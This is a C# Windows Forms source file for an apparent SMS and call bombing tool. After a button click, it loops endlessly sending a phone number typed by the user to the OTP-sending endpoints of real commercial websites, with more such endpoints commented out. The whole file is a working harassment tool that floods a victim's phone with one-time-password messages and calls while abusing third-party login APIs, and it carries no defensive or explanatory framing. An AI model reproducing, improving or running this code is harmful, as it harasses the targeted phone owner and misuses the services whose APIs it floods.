using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Spacialkaam : Form
    {
        int i=0;
        public Spacialkaam()
        {
            InitializeComponent();
        }

        private void Label1_Click(object sender, EventArgs e)
        {

        }

        private void Btnsend_Click(object sender, EventArgs e)
        {
            i = 1;
             postAsync();
        }
        private async Task postAsync()
        {
            while(i==1)
            {
                string num = textBox1.Text;
                HttpClient client = new HttpClient();
                var values = new Dictionary<string, string>
                {
                    { "phone", num },
               { "POST", "Sent" }
                };
                var content = new FormUrlEncodedContent(values);
                var response = await client.PostAsync(
                       "https://login.housing.com/api/v2/send-otp", content);
                var result = await response.Content.ReadAsStringAsync();

                //values = new Dictionary<string, string>
                //{
                //   { "phoneNumber", num },
                //   { "page", "free-trial-classes" },
                //     { "POST", "" },
                //      { "isOtpExhausted", "false" }
                //};
                // content = new FormUrlEncodedContent(values);
                // response = await client.PostAsync(
                //       "https://mtnucleus.byjusweb.com/api/acs/v2/send-otp", content);
                // result = await response.Content.ReadAsStringAsync();

                //values = new Dictionary<string, string>
                //{
                //   { "type", "mobile" },
                //   { "phone", num },
                //     { "is_voice_otp", "+91" },
                //     { "POST", "" },
                //       { "success", "true" }
                //};
                //content = new FormUrlEncodedContent(values);
                //response = await client.PostAsync(
                //      "https://api.crofarm.com/cons/consumer/otp/v1/", content);
                //result = await response.Content.ReadAsStringAsync();

                values = new Dictionary<string, string>
            {
               { "phoneNo", num},
               { "Content-Type", "application/json" },
                 { "POST", "200" }
                
            };
                content = new FormUrlEncodedContent(values);
                response = await client.PostAsync(
                      "https://www.loanbaba.com/sdgpeknj/MAppService.asmx/SendOTPonCall", content);
                result = await response.Content.ReadAsStringAsync();
            }
        }
    }
}
